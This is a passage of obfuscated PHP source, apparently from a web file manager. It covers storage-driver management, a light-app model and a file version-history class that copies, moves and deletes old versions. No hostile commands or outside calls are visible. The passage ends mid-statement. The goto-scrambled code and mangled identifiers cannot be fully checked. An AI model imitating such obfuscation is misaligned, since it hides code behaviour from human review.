$bëŞâÎŸ­ˆ = json_decode($BïÏ‘ÌÙïÑ[$fÅ¸À·ÓÛ[6]], !0); goto c„ËË‘¸Ó¹; Díå´œ¼©: $eƒ™§«ááœ = isset($f‰¿¼“ÎÀß[$A‚¬½œ¬ˆ]) ? $f‰¿¼“ÎÀß[$A‚¬½œ¬ˆ] : ucfirst($A‚¬½œ¬ˆ); $c’ãÌ’Œ¶Š = $fÅ¸À·ÓÛ[71] . $eƒ™§«ááœ; if (!$eƒ™§«ááœ || !class_exists($c’ãÌ’Œ¶Š)) { write_log(array($fÅ¸À·ÓÛ[1967], $BïÏ‘ÌÙïÑ, get_caller_info()), $fÅ¸À·ÓÛ[1968]); show_json(LNG($fÅ¸À·ÓÛ[1969]), !1, $BïÏ‘ÌÙïÑ); } goto c««™™”Ê; c„ËË‘¸Ó¹: foreach ($bëŞâÎŸ­ˆ as $fƒé­¡¶Ï => $Eä‰ôöà³) { $bëŞâÎŸ­ˆ[$fƒé­¡¶Ï] = trim($Eä‰ôöà³); } $bëŞâÎŸ­ˆ[$fÅ¸À·ÓÛ[1966]] = rand_string(6); $f‰¿¼“ÎÀß = $GLOBALS[$fÅ¸À·ÓÛ[6]][$fÅ¸À·ÓÛ[87]][$fÅ¸À·ÓÛ[768]]; goto Díå´œ¼©; Déùàˆå‡Á: $BïÏ‘ÌÙïÑ[$fÅ¸À·ÓÛ[6]] = json_encode($bëŞâÎŸ­ˆ); $BïÏ‘ÌÙïÑ[$fÅ¸À·ÓÛ[93]] = $eƒ™§«ááœ; return !0; goto aŞ¦³ŒŸ; c««™™”Ê: $bàŒïÎù× = new $c’ãÌ’Œ¶Š($bëŞâÎŸ­ˆ); if (in_array($A‚¬½œ¬ˆ, $bàŒïÎù×->objectDriver)) { if (!$bàŒïÎù×->isBucketCors() && !$bàŒïÎù×->setBucketCors()) { $a¯¼íİğèØ = LNG($fÅ¸À·ÓÛ[1970]); $a¯¼íİğèØ .= $fÅ¸À·ÓÛ[1971] . LNG($fÅ¸À·ÓÛ[1972]); show_json($a¯¼íİğèØ, !1); } } $aïÕ«›²ƒ² = rtrim($bëŞâÎŸ­ˆ[$fÅ¸À·ÓÛ[1050]], $fÅ¸À·ÓÛ[8]) . $fÅ¸À·ÓÛ[8]; goto a…ë‚­Íõ½; a…ë‚­Íõ½: $Dàªåèï…ñ = $bàŒïÎù×->getPath($aïÕ«›²ƒ² . $fÅ¸À·ÓÛ[1111]); if (!$bàŒïÎù×->mkfile($Dàªåèï…ñ)) { show_json(LNG($fÅ¸À·ÓÛ[1970]), !1); } $bëŞâÎŸ­ˆ[$fÅ¸À·ÓÛ[1050]] = $aïÕ«›²ƒ²; goto Déùàˆå‡Á; aŞ¦³ŒŸ: } public function driverListSystem() { $dÚ›ËÆÈŸ´ =& $_SERVER[Â€Á›¨õ]; $b‚…ì…‡È´ = parent::listData(); $D…è—«ÒÁ = array(); foreach ($b‚…ì…‡È´ as $BñÑÏ£••) { unset($BñÑÏ£••[$dÚ›ËÆÈŸ´[192]], $BñÑÏ£••[$dÚ›ËÆÈŸ´[83]]); $BñÑÏ£••[$dÚ›ËÆÈŸ´[6]] = json_decode($BñÑÏ£••[$dÚ›ËÆÈŸ´[6]], !0); $D…è—«ÒÁ[] = $BñÑÏ£••; } return $D…è—«ÒÁ; } public function defaultDriver() { $AöÏ­¬ÍÀÍ =& $_SERVER[Â€Á›¨õ]; $FøÈ–ÃÏ«İ = parent::listData(); $eÅÀ†±— = array_filter_by_field($FøÈ–ÃÏ«İ, $AöÏ­¬ÍÀÍ[34], 1); $eÅÀ†±— = $eÅÀ†±—[0]; if ($eÅÀ†±—) { $eÅÀ†±—[$AöÏ­¬ÍÀÍ[6]] = json_decode($eÅÀ†±—[$AöÏ­¬ÍÀÍ[6]], !0); } return $eÅÀ†±—; } public function driverInfo($Fè¯¬ª¯ä) { $B•ŞùÏÜç‡ =& $_SERVER[Â€Á›¨õ]; $DßÜ¶’¢™ = array_to_keyvalue(parent::listData(), $B•ŞùÏÜç‡[388]); if (!isset($DßÜ¶’¢™[$Fè¯¬ª¯ä])) { return !1; } $AÍ‘ĞºòŒ = $DßÜ¶’¢™[$Fè¯¬ª¯ä]; $AÍ‘ĞºòŒ[$B•ŞùÏÜç‡[6]] = json_decode($AÍ‘ĞºòŒ[$B•ŞùÏÜç‡[6]], !0); return $AÍ‘ĞºòŒ; } public function remove($Fó¥µœÅ†Â) { $this->removeShareItems($Fó¥µœÅ†Â); return parent::remove($Fó¥µœÅ†Â); } public function removeWithFile($fë…ŞÆ¡è„, $B—ø»©Å±Ú) { goto e§Ç­èÀ£ï; cµ·‹á¾ñ‹: $dÁ†¦£Œã = "\173\x69\157\x3a{$dŸŒƒš×àÕ}\x7d\x2f"; $FÛÌÇÇê› = !0; $C¹Ã¥”Îç° = array(); goto a¶àœøÆ™Ì; e§Ç­èÀ£ï: $AØôí‰ßÃ¤ =& $_SERVER[Â€Á›¨õ]; $dÄ”ŒÃäø¾ = array($AØôí‰ßÃ¤[760] => $fë…ŞÆ¡è„); $c×¸„öÜÖ“ = Model($AØôí‰ßÃ¤[444])->where($dÄ”ŒÃäø¾)->count(); goto C‰·¶Ù¹Üë; C‰·¶Ù¹Üë: $d…³òÇŸê = Model($AØôí‰ßÃ¤[444])->where($dÄ”ŒÃäø¾)->sum($AØôí‰ßÃ¤[77]); $AÊ»›Ô¸Ë™ = $B—ø»©Å±Ú . $AØôí‰ßÃ¤[1973] . $fë…ŞÆ¡è„; $DÛœ¢ôŠ¬Ê = new TaskFileTransfer($AÊ»›Ô¸Ë™, $AØôí‰ßÃ¤[1968], $c×¸„öÜÖ“, LNG($AØôí‰ßÃ¤[1974]) . "\50{$fë…ŞÆ¡è„}\51"); goto fÁâ§õ©ĞÅ; fÁâ§õ©ĞÅ: $DÛœ¢ôŠ¬Ê->task[$AØôí‰ßÃ¤[711]] = (double) $d…³òÇŸê; $C“Èè•Š¸ = KodIO::defaultDriver(); $dŸŒƒš×àÕ = $C“Èè•Š¸[$AØôí‰ßÃ¤[388]]; goto cµ·‹á¾ñ‹; B«é•ì“Ñó: if (!$FÛÌÇÇê›) { $DÛœ¢ôŠ¬Ê->stop($AÊ»›Ô¸Ë™); return !1; } $DÛœ¢ôŠ¬Ê->end(); if ($B—ø»©Å±Ú == $AØôí‰ßÃ¤[1630]) { $this->remove($fë…ŞÆ¡è„); } goto Cßõ×¯µß; a¶àœøÆ™Ì: $aæ§½Š ¢ = Model($AØôí‰ßÃ¤[173])->where($dÄ”ŒÃäø¾)->field($AØôí‰ßÃ¤[1975])->select(); foreach ($aæ§½Š ¢ as $cùëÍ»ç) { goto Bö§àä”Ãá; CËÚëĞ’´©: if (IO::exist($B‚´Ôš¼ )) { $DÛœ¢ôŠ¬Ê->updateFileEnd($cùëÍ»ç[$AØôí‰ßÃ¤[28]], $cùëÍ»ç[$AØôí‰ßÃ¤[77]]); continue; } if (!IO::move($dÅêµ¦¨Šì, get_path_father($B‚´Ôš¼ ))) { $FÛÌÇÇê› = !1; break; } $dÄ”ŒÃäø¾ = array($AØôí‰ßÃ¤[441] => $cùëÍ»ç[$AØôí‰ßÃ¤[441]]); goto a–²òÖ½‘æ; Bö§àä”Ãá: $dÅêµ¦¨Šì = $cùëÍ»ç[$AØôí‰ßÃ¤[75]]; $B‚´Ôš¼  = $dÁ†¦£Œã . str_replace("\x7b\151\x6f\x3a{$fë…ŞÆ¡è„}\175\x2f", $AØôí‰ßÃ¤[33], $dÅêµ¦¨Šì); if (!IO::exist($dÅêµ¦¨Šì)) { $C¹Ã¥”Îç°[] = $cùëÍ»ç[$AØôí‰ßÃ¤[441]]; $DÛœ¢ôŠ¬Ê->updateFileEnd($cùëÍ»ç[$AØôí‰ßÃ¤[28]], $cùëÍ»ç[$AØôí‰ßÃ¤[77]]); continue; } goto CËÚëĞ’´©; a–²òÖ½‘æ: $b®Çô ç«ë = array($AØôí‰ßÃ¤[760] => $dŸŒƒš×àÕ, $AØôí‰ßÃ¤[75] => $B‚´Ôš¼ ); Model($AØôí‰ßÃ¤[173])->where($dÄ”ŒÃäø¾)->save($b®Çô ç«ë); goto a¦ŞßĞéøœ; a¦ŞßĞéøœ: } $this->removeByFileID($C¹Ã¥”Îç°); goto B«é•ì“Ñó; Cßõ×¯µß: } public function progress($AÜôš¦Ç¦, $FÉæØ‹ÁíÚ) { return Task::get($FÉæØ‹ÁíÚ . $_SERVER[Â€Á›¨õ][1973] . $AÜôš¦Ç¦); } private function removeByFileID($CÃ‰ä¦Ö = array()) { goto d¹Ğ¡§¸—„; f‰ßò…³ËÍ: $A©Ò˜¶ãµÁ = Model($E«Ô”¶´Ó°[1178])->where($fí§²®š› )->field($E«Ô”¶´Ó°[390])->select(); if (!$A©Ò˜¶ãµÁ) { return; } $A©Ò˜¶ãµÁ = array_to_keyvalue($A©Ò˜¶ãµÁ, $E«Ô”¶´Ó°[33], $E«Ô”¶´Ó°[390]); goto e…™Õ‹‹––; d¹Ğ¡§¸—„: $E«Ô”¶´Ó° =& $_SERVER[Â€Á›¨õ]; if (empty($CÃ‰ä¦Ö)) { return; } $fí§²®š›  = array($E«Ô”¶´Ó°[441] => array($E«Ô”¶´Ó°[7], $CÃ‰ä¦Ö)); goto f‰ßò…³ËÍ; e…™Õ‹‹––: foreach ($A©Ò˜¶ãµÁ as $fùºò»ÓÁ) { Model($E«Ô”¶´Ó°[403])->removeNow($fùºò»ÓÁ, !1); } goto b«…ôîò„…; b«…ôîò„…: } private function removeShareItems($d›Åš™òÈ) { goto BæŠ×·Æññ; Eµ×ºâ¤²: $fç®ïÇš²Ò = Model($FÖ»ğò[1641])->where($C‚ÉŒ÷·ó)->field($FÖ»ğò[462])->select(); if (empty($fç®ïÇš²Ò)) { return; } $a—§äËß¯ë = array_to_keyvalue($fç®ïÇš²Ò, $FÖ»ğò[33], $FÖ»ğò[462]); goto DÛÒ­Ã‰˜; DÛÒ­Ã‰˜: Model($FÖ»ğò[558])->remove($a—§äËß¯ë); goto D¬ÙáÊ™½½; BæŠ×·Æññ: $FÖ»ğò =& $_SERVER[Â€Á›¨õ]; $b‘Ï¯œ«« = "\173\x69\157\x3a{$d›Åš™òÈ}\x7d\x2f"; $C‚ÉŒ÷·ó = array($FÖ»ğò[390] => 0, $FÖ»ğò[1045] => array($FÖ»ğò[378], "{$b‘Ï¯œ««}\x25")); goto Eµ×ºâ¤²; D¬ÙáÊ™½½: } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\x53\x79\163\x74\x65\155\x2e\x4c\x69\x67\150\x74\x41\160\160"; public $modelType = "\x53\x79\163\164\x65\x6d\117\x70\164\x69\x6f\156"; public $field = array("\156\x61\155\145", "\x67\x72\x6f\165\x70", "\x64\145\x73\143", "\x63\157\156\x74\x65\x6e\164"); public function listData($fåìäŸ©±© = false, $BÛğğ‹­Èƒ = "\155\157\x64\x69\x66\x79\x54\151\x6d\145", $Aîóçßâô = true) { return parent::listData($fåìäŸ©±©, $BÛğğ‹­Èƒ, $Aîóçßâô); } public function remove($CóÈŞÍ»¿) { $aÒßÊèº = $this->findByName($CóÈŞÍ»¿); if (!$aÒßÊèº) { return !1; } return parent::remove($aÒßÊèº[$_SERVER[Â€Á›¨õ][388]]); } public function add($c‹¤…®Ëîƒ) { if ($this->findByName($c‹¤…®Ëîƒ[$_SERVER[Â€Á›¨õ][28]])) { return !1; } return parent::insert($c‹¤…®Ëîƒ); } public function update($AäÔÍá‚Å¤, $Dˆßùášæ) { $bÙ†×ÕÃ =& $_SERVER[Â€Á›¨õ]; $BïÔí‹ö¼å = $this->findByName($AäÔÍá‚Å¤); $D•À‰ôñÂÊ = $this->findByName($Dˆßùášæ[$bÙ†×ÕÃ[28]]); if (!$BïÔí‹ö¼å || $D•À‰ôñÂÊ && $D•À‰ôñÂÊ[$bÙ†×ÕÃ[388]] != $BïÔí‹ö¼å[$bÙ†×ÕÃ[388]]) { return !1; } return parent::update($BïÔí‹ö¼å[$bÙ†×ÕÃ[388]], $Dˆßùášæ); } } goto a¼¢ °š; e‡÷±‚Ø‚: class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { goto DÃ³‰¤ò÷Æ; A‚ªŠƒœ«ö: Hook::bind($eÅëƒÍÙ Ú[1089], $eÅëƒÍÙ Ú[1090]); goto Bçù…‚¯ª; e×öªöƒÔ: if (isset($_REQUEST[$eÅëƒÍÙ Ú[1078]]) && $_REQUEST[$eÅëƒÍÙ Ú[1078]] == $eÅëƒÍÙ Ú[86]) { return; } Hook::bind($eÅëƒÍÙ Ú[1079], $eÅëƒÍÙ Ú[1080]); Hook::bind($eÅëƒÍÙ Ú[1081], $eÅëƒÍÙ Ú[1082]); goto eÉæÍµºšŸ; DÃ³‰¤ò÷Æ: $eÅëƒÍÙ Ú =& $_SERVER[Â€Á›¨õ]; $bßôğ‚ÜáÎ = $GLOBALS[$eÅëƒÍÙ Ú[6]][$eÅëƒÍÙ Ú[87]][$eÅëƒÍÙ Ú[1077]]; if ($bßôğ‚ÜáÎ <= 0) { return; } goto e×öªöƒÔ; eÉæÍµºšŸ: Hook::bind($eÅëƒÍÙ Ú[1083], $eÅëƒÍÙ Ú[1084]); Hook::bind($eÅëƒÍÙ Ú[1085], $eÅëƒÍÙ Ú[1086]); Hook::bind($eÅëƒÍÙ Ú[1087], $eÅëƒÍÙ Ú[1088]); goto A‚ªŠƒœ«ö; Bçù…‚¯ª: } public static function eventBeforeUpload($F™·ª¬¾§ô) { if ($F™·ª¬¾§ô[3] && $F™·ª¬¾§ô[3] != REPEAT_REPLACE) { return; } $E´ê«ç¢ŞÔ = self::parsePath($F™·ª¬¾§ô[0]); if (!$E´ê«ç¢ŞÔ) { return; } self::add($E´ê«ç¢ŞÔ); } public static function eventBeforeEdit($F®˜š¢¨¯º) { $a¶Ëë†…²ç = self::parsePath($F®˜š¢¨¯º[0]); if (!$a¶Ëë†…²ç) { return; } self::add($a¶Ëë†…²ç); } public static function eventBeforeCopyFile($B°À¸ø”Šç, $D³ïÛÑÜ˜å, $dÊ¯ãèç—ˆ, $B¤šğËù×‹, $dĞÁØòœî±, $fé­à–·Ã) { $dîÖÉÛŠé› = $dÊ¯ãèç—ˆ->getPathOuter($B¤šğËù×‹); $Föİ„ÌÂˆ– = self::parsePath($dîÖÉÛŠé›); if (!$Föİ„ÌÂˆ–) { return; } self::add($Föİ„ÌÂˆ–); } public static function eventBeforeRename($DñË–Õë¸¨) { $Dµ­ùÊ¿ëç =& $_SERVER[Â€Á›¨õ]; $aµæ‹ï‚µğ = self::parsePath($DñË–Õë¸¨[0]); if (!$aµæ‹ï‚µğ) { return; } $b˜ö²ÆŒĞ = self::checkInHistory($aµæ‹ï‚µğ); if (!$b˜ö²ÆŒĞ) { return; } if ($b˜ö²ÆŒĞ[$Dµ­ùÊ¿ëç[29]] == $Dµ­ùÊ¿ëç[173]) { $e•èªºáÕ× = self::listData($aµæ‹ï‚µğ); if ($e•èªºáÕ× && $e•èªºáÕ×[$Dµ­ùÊ¿ëç[365]]) { self::moveHistory($aµæ‹ï‚µğ, $DñË–Õë¸¨[1]); } } else { IO::rename($b˜ö²ÆŒĞ[$Dµ­ùÊ¿ëç[75]], $DñË–Õë¸¨[1]); } } public static function eventBeforeMove($b­‰¦®—äº) { goto D’‚³ÛÌ„À; c¬„í§¿ˆ­: if ($a²ÂÁÇˆ‰[$c±áˆ¢Èª[29]] == $c±áˆ¢Èª[173]) { $F—ĞÜÍêÁ = self::listData($CÊÂ——Ç÷ô); $BºÀù™•Á = rtrim($bõ·’‹Ìí, $c±áˆ¢Èª[8]) . $c±áˆ¢Èª[8] . ($aÜâ¨ÈšÃò ? $aÜâ¨ÈšÃò : get_path_this($CÊÂ——Ç÷ô)); $fóÇÉì×— = self::listData($BºÀù™•Á); if ($F—ĞÜÍêÁ && $F—ĞÜÍêÁ[$c±áˆ¢Èª[365]] && $fóÇÉì×— && $fóÇÉì×—[$c±áˆ¢Èª[365]]) { return self::clear($CÊÂ——Ç÷ô); } if ($F—ĞÜÍêÁ && $F—ĞÜÍêÁ[$c±áˆ¢Èª[365]]) { self::moveHistory($CÊÂ——Ç÷ô, $aÜâ¨ÈšÃò, $få¬³ÃîŸ¿); } } else { IO::move($a²ÂÁÇˆ‰[$c±áˆ¢Èª[75]], $få¬³ÃîŸ¿, !1, $aÜâ¨ÈšÃò); self::clearEmptyFolder(IO::pathFather($a²ÂÁÇˆ‰[$c±áˆ¢Èª[75]])); } goto Eâ™êÌÑÉ’; F’‚”…´ø: $bõ·’‹Ìí = self::parsePath($b­‰¦®—äº[1]); if (!$bõ·’‹Ìí) { return; } $aÜâ¨ÈšÃò = $b­‰¦®—äº[3]; goto C¹†‘çŒ†Š; D’‚³ÛÌ„À: $c±áˆ¢Èª =& $_SERVER[Â€Á›¨õ]; $CÊÂ——Ç÷ô = self::parsePath($b­‰¦®—äº[0]); if (!$CÊÂ——Ç÷ô) { return; } goto F’‚”…´ø; C¹†‘çŒ†Š: $a²ÂÁÇˆ‰ = self::checkInHistory($CÊÂ——Ç÷ô); if (!$a²ÂÁÇˆ‰) { return; } $få¬³ÃîŸ¿ = self::pathHistory($bõ·’‹Ìí); goto c¬„í§¿ˆ­; Eâ™êÌÑÉ’: } public static function eventAfterRemove($aŠåøÓÏº˜, $e‚Ïö‹•êÄ) { goto EŒóœ‰ ¢£; DÏ’õ½¢Õ: if (!$c¯Ã©£ª²) { return; } $B ¥¹¡Ñ‹È = self::checkInHistory($c¯Ã©£ª²); if (!$B ¥¹¡Ñ‹È) { return; } goto EÀ¥ŒÛ‰ÙĞ; EŒóœ‰ ¢£: $e¥ì£²â‚ê =& $_SERVER[Â€Á›¨õ]; if (!$e‚Ïö‹•êÄ) { return; } $c¯Ã©£ª² = self::parsePath($aŠåøÓÏº˜[0]); goto DÏ’õ½¢Õ; EÀ¥ŒÛ‰ÙĞ: if ($B ¥¹¡Ñ‹È[$e¥ì£²â‚ê[29]] == $e¥ì£²â‚ê[173]) { $DŒ…Çğ¸àö = self::listData($c¯Ã©£ª², !1); if ($DŒ…Çğ¸àö && $DŒ…Çğ¸àö[$e¥ì£²â‚ê[365]]) { self::clear($c¯Ã©£ª², !1); } } else { IO::remove($B ¥¹¡Ñ‹È[$e¥ì£²â‚ê[75]]); self::clearEmptyFolder(IO::pathFather($B ¥¹¡Ñ‹È[$e¥ì£²â‚ê[75]])); } goto A¹¢Ç§óƒ¸; A¹¢Ç§óƒ¸: } private static function checkInHistory($AƒÛëÈ²ˆ) { $a·Î‘Ä‡î½ = self::pathHistory($AƒÛëÈ²ˆ); if (!IO::exist($a·Î‘Ä‡î½)) { $a·Î‘Ä‡î½ .= $_SERVER[Â€Á›¨õ][1091]; } return IO::exist($a·Î‘Ä‡î½) ? IO::info($a·Î‘Ä‡î½) : !1; } private static function parsePath($cËÏ²éÖ±Ê) { goto b˜­¯–½áª; Eî²ìŠŒáˆ: $eñ¶–¾÷Ã» = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $fŒäÑ’İ®¡[1094]); foreach ($eñ¶–¾÷Ã» as $C±‘‘ó½ô) { if (!$E±Å±÷Õ¡ && substr($cËÏ²éÖ±Ê, 0, strlen($C±‘‘ó½ô)) == $C±‘‘ó½ô) { return !1; } } self::log($GLOBALS[$fŒäÑ’İ®¡[1017]] . $fŒäÑ’İ®¡[1095] . $cËÏ²éÖ±Ê); goto EçÇ£ÍÏÄÒ; EçÇ£ÍÏÄÒ: return $cËÏ²éÖ±Ê; goto EÑÔÚ—ã„Ç; Bíï÷¾´–°: $Bì©ˆ™îÕ = KodIO::parse($cËÏ²éÖ±Ê); $E±Å±÷Õ¡ = $Bì©ˆ™îÕ[$fŒäÑ’İ®¡[29]]; $eÉ¨²­Ã‡¤ = !$E±Å±÷Õ¡ || $E±Å±÷Õ¡ == KodIO::KOD_IO || $E±Å±÷Õ¡ == KodIO::KOD_SHARE_ITEM; goto cğğãõ ×Ü; b˜­¯–½áª: $fŒäÑ’İ®¡ =& $_SERVER[Â€Á›¨õ]; if (!$cËÏ²éÖ±Ê) { return !1; } if ($GLOBALS[$fŒäÑ’İ®¡[1092]]) { return; } goto Bíï÷¾´–°; cğğãõ ×Ü: if (!$eÉ¨²­Ã‡¤ || !$Bì©ˆ™îÕ[$fŒäÑ’İ®¡[1093]]) { return !1; } if ($E±Å±÷Õ¡ == KodIO::KOD_SHARE_ITEM) { $A»ˆÃ‚øÀÅ = IO::init($cËÏ²éÖ±Ê); if ($A»ˆÃ‚øÀÅ->pathParse[$fŒäÑ’İ®¡[1022]]) { return self::parsePath($A»ˆÃ‚øÀÅ->pathParse[$fŒäÑ’İ®¡[1022]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } goto Eî²ìŠŒáˆ; EÑÔÚ—ã„Ç: } private static function pathHistory($fÙ¦ÆÕ¢İï) { $dŠ…ÑÌ‰Ö´ =& $_SERVER[Â€Á›¨õ]; $EíéÖ‹Ôë² = self::$_historyBase . ltrim(KodIO::clear($fÙ¦ÆÕ¢İï), $dŠ…ÑÌ‰Ö´[8]); $EíéÖ‹Ôë² = str_replace(array($dŠ…ÑÌ‰Ö´[1096]), array($dŠ…ÑÌ‰Ö´[1097]), $EíéÖ‹Ôë²); return $EíéÖ‹Ôë²; } public static function log($cÎÛ°´¶ªÖ) { } public static function historyCount($fĞ’÷ƒ£Ìï) { $Aª„›äÓ¬Ù =& $_SERVER[Â€Á›¨õ]; $fØô‰¤³ò = array(); $aº¡ê°‘¹Œ = array(); foreach ($fĞ’÷ƒ£Ìï as $F¢çæïªÓê) { $e ´ÄğÔ— = get_path_father($F¢çæïªÓê); if (!$aº¡ê°‘¹Œ[$e ´ÄğÔ—]) { $aº¡ê°‘¹Œ[$e ´ÄğÔ—] = array(); } $aº¡ê°‘¹Œ[$e ´ÄğÔ—][] = get_path_this($F¢çæïªÓê); } foreach ($aº¡ê°‘¹Œ as $e ´ÄğÔ— => $A–É´¦¾ò) { $E×‡ä…ƒÈ° = self::parsePath($e ´ÄğÔ—); if (!$E×‡ä…ƒÈ°) { continue; } foreach ($A–É´¦¾ò as $dğÚŒ¸ø˜š) { $F®÷¯ğ”‹¬ = self::listData(rtrim($E×‡ä…ƒÈ°, $Aª„›äÓ¬Ù[8]) . $Aª„›äÓ¬Ù[8] . $dğÚŒ¸ø˜š, !1); if ($F®÷¯ğ”‹¬ && $F®÷¯ğ”‹¬[$Aª„›äÓ¬Ù[365]]) { $fØô‰¤³ò[rtrim($e ´ÄğÔ—, $Aª„›äÓ¬Ù[8]) . $Aª„›äÓ¬Ù[8] . $dğÚŒ¸ø˜š] = count($F®÷¯ğ”‹¬[$Aª„›äÓ¬Ù[365]]); } } } return $fØô‰¤³ò; } public static function add($d‘¥Â‹ÒÌÇ) { goto eÊáËÃ¬¦õ; fóŒì©Œ ¾: $cïªÓôœ¶„ = $c†‡åàãÀ³[$BÁ÷ñßª„Ø[365]]; if ($Cææ¬³¨ä“[$BÁ÷ñßª„Ø[77]] == 0) { return; } if ($Cææ¬³¨ä“[$BÁ÷ñßª„Ø[77]] >= 1024 * 1024 * 500) { return !1; } goto d¾ªó¸Ğ«ë; eÑÁƒµ¼ª±: $A‹ÖÛ½¤”° = array($BÁ÷ñßª„Ø[388] => $BØ«®‚§×, $BÁ÷ñßª„Ø[170] => $C Íïˆîà, $BÁ÷ñßª„Ø[28] => $Cææ¬³¨ä“[$BÁ÷ñßª„Ø[28]] . $BÁ÷ñßª„Ø[94] . date($BÁ÷ñßª„Ø[1101]) . rand_string(1), $BÁ÷ñßª„Ø[77] => $Cææ¬³¨ä“[$BÁ÷ñßª„Ø[77]], $BÁ÷ñßª„Ø[426] => USER_ID, $BÁ÷ñßª„Ø[192] => time(), $BÁ÷ñßª„Ø[1102] => $BÁ÷ñßª„Ø[33]); IO::mkdir($c†‡åàãÀ³[$BÁ÷ñßª„Ø[1103]]); $b§—Ğô‰Œ¶ = IO::copy($d‘¥Â‹ÒÌÇ, $c†‡åàãÀ³[$BÁ÷ñßª„Ø[1103]], !1, $A‹ÖÛ½¤”°[$BÁ÷ñßª„Ø[28]]); goto bà¼šô‡â¸; bà¼šô‡â¸: if (!$b§—Ğô‰Œ¶) { self::clearEmptyFolder($c†‡åàãÀ³[$BÁ÷ñßª„Ø[1103]]); return !1; } array_unshift($cïªÓôœ¶„, $A‹ÖÛ½¤”°); if (count($cïªÓôœ¶„) > $F‰Š‚ñæùÜ) { $béÊ ôùš² = array_slice($cïªÓôœ¶„, $F‰Š‚ñæùÜ); foreach ($béÊ ôùš² as $a†ƒƒ³šÀ«) { IO::remove($c†‡åàãÀ³[$BÁ÷ñßª„Ø[1103]] . $a†ƒƒ³šÀ«[$BÁ÷ñßª„Ø[28]]); } $cïªÓôœ¶„ = array_slice($cïªÓôœ¶„, 0, $F‰Š‚ñæùÜ); } goto c™¨®‡ÇĞÄ; bÏ‹Ñïª–Š: if ($E•§‰í«‘ <= 0) { return; } $C Íïˆîà = IO::hashSimple($d‘¥Â‹ÒÌÇ); $Cææ¬³¨ä“ = IO::info($d‘¥Â‹ÒÌÇ); goto fóŒì©Œ ¾; c™¨®‡ÇĞÄ: return self::saveData($c†‡åàãÀ³[$BÁ÷ñßª„Ø[1104]], $cïªÓôœ¶„); goto FÎ¸¨ï¯å²; eÊáËÃ¬¦õ: $BÁ÷ñßª„Ø =& $_SERVER[Â€Á›¨õ]; $c†‡åàãÀ³ = self::listData($d‘¥Â‹ÒÌÇ); if (!$c†‡åàãÀ³) { return; } goto D‹…ÉÜĞõ; D‹…ÉÜĞõ: $B¢–¦ºˆäî = Model($BÁ÷ñßª„Ø[1098])->get($BÁ÷ñßª„Ø[1099]); $E•§‰í«‘ = $GLOBALS[$BÁ÷ñßª„Ø[6]][$BÁ÷ñßª„Ø[87]][$BÁ÷ñßª„Ø[1077]]; $F‰Š‚ñæùÜ = $B¢–¦ºˆäî == $BÁ÷ñßª„Ø[1100] ? 5 : $E•§‰í«‘; goto bÏ‹Ñïª–Š; d¾ªó¸Ğ«ë: if ($cïªÓôœ¶„ && $cïªÓôœ¶„[0][$BÁ÷ñßª„Ø[170]] == $C Íïˆîà) { return !0; } if (array_key_exists($BÁ÷ñßª„Ø[194], $Cææ¬³¨ä“) && !$Cææ¬³¨ä“[$BÁ÷ñßª„Ø[194]]) { return !1; } $BØ«®‚§× = short_id(time()); goto eÑÁƒµ¼ª±; FÎ¸¨ï¯å²: } public static function remove($C•ôºæ–×‹, $BÊ²‚èÂåß) { $d›Òô”ë =& $_SERVER[Â€Á›¨õ]; $C‡ó§Ç¯” = self::listData($C•ôºæ–×‹); $DóÆªÇÓá° = array(); if (!$C‡ó§Ç¯”) { return !1; } foreach ($C‡ó§Ç¯”[$d›Òô”ë[365]] as $d˜ª¬ö®Éå) { if ($d˜ª¬ö®Éå[$d›Òô”ë[388]] == $BÊ²‚èÂåß) { IO::remove($C‡ó§Ç¯”[$d›Òô”ë[1103]] . $d˜ª¬ö®Éå[$d›Òô”ë[28]]); continue; } $DóÆªÇÓá°[] = $d˜ª¬ö®Éå; } return self::saveData($C‡ó§Ç¯”[$d›Òô”ë[1104]], $DóÆªÇÓá°); } public static function clear($A“äŠÚè, $f‹™ìÇÎÍÓ = true) { $AºéÃÓò¤ğ =& $_SERVER[Â€Á›¨õ]; $FÑ™Âƒ£¥ = self::listData($A“äŠÚè, $f‹™ìÇÎÍÓ); if (!$FÑ™Âƒ£¥) { return !1; } foreach ($FÑ™Âƒ£¥[$AºéÃÓò¤ğ[365]] as $A¿»ÅÍõÂ´) { IO::remove($FÑ™Âƒ£¥[$AºéÃÓò¤ğ[1103]] . $A¿»ÅÍõÂ´[$AºéÃÓò¤ğ[28]]); } return self::saveData($FÑ™Âƒ£¥[$AºéÃÓò¤ğ[1104]], array()); } public static function moveHistory($EÅ¦³èÛš‚, $f—‚‰º¢š¬ = '', $dµŒÈ‹İÜ = '') { goto CâŠ¾ÊŞ¾œ; d°ìã£Ñ½È: $FºåŞ¾®æ = substr(get_path_this($B“›°ßŞ²¬[$a³‚ïËÃŸ[1104]]), 0, -strlen($Bİ—´äØ®à)); foreach ($B“›°ßŞ²¬[$a³‚ïËÃŸ[365]] as $dé™„Æå¨å => $d‹†–ÃàÈš) { $dÅÎÛÒõóß = $f—‚‰º¢š¬ . substr($d‹†–ÃàÈš[$a³‚ïËÃŸ[28]], strlen($FºåŞ¾®æ)); $BÁè±õè = IO::move($B“›°ßŞ²¬[$a³‚ïËÃŸ[1103]] . $d‹†–ÃàÈš[$a³‚ïËÃŸ[28]], $dµŒÈ‹İÜ, !1, $dÅÎÛÒõóß); if ($BÁè±õè) { $B“›°ßŞ²¬[$a³‚ïËÃŸ[365]][$dé™„Æå¨å][$a³‚ïËÃŸ[28]] = $dÅÎÛÒõóß; } } $B“›°ßŞ²¬[$a³‚ïËÃŸ[1104]] = IO::move($B“›°ßŞ²¬[$a³‚ïËÃŸ[1104]], $dµŒÈ‹İÜ, !1, $f—‚‰º¢š¬ . $Bİ—´äØ®à); goto bŠÙæÜïÛ; CâŠ¾ÊŞ¾œ: $a³‚ïËÃŸ =& $_SERVER[Â€Á›¨õ]; $B“›°ßŞ²¬ = self::listData($EÅ¦³èÛš‚, !1); if (!$B“›°ßŞ²¬ || !$B“›°ßŞ²¬[$a³‚ïËÃŸ[365]]) { return !1; } goto d‰¦ï¶»ï; bŠÙæÜïÛ: self::saveData($B“›°ßŞ²¬[$a³‚ïËÃŸ[1104]], $B“›°ßŞ²¬[$a³‚ïËÃŸ[365]]); self::clearEmptyFolder($B“›°ßŞ²¬[$a³‚ïËÃŸ[1103]]); goto 